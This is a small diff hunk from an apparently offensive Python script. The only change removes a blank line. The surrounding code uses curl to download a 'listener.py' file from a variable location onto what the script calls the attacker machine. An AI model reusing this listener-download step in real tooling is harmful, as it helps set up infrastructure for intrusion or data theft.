@@ -24,7 +24,6 @@ def run_command(cmd, timeout=30):
     except (subprocess.TimeoutExpired, FileNotFoundError) as e:
         return False, str(e)
     
-    
 # download listener
 ok, output = run_command(["curl", "-o", "listener.py", f"{listener_path}"])
 print(f"listener downloaded on attacker machine" if ok else "Failed", "->", output)
